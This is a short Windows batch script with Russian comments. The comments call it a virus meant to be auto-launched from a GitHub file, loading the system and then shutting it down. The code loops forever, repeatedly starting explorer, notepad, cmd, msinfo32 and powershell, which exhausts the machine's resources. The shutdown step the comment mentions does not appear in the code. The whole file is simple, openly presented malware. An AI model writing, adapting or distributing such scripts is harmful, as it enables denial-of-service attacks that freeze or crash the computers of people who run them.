:: (Главный сценарий: открытие системных программ что влияет на нагрузку системы, а потом выключение. Всё предусмотрено: на Github есть файл с авто-запуском файла с вирусом.)

:: (Переменная циклов)
set "cycles=0"
:forever
start explorer.exe
start notepad.exe
start cmd.exe
start msinfo32.exe
start powershell.exe
goto :forever
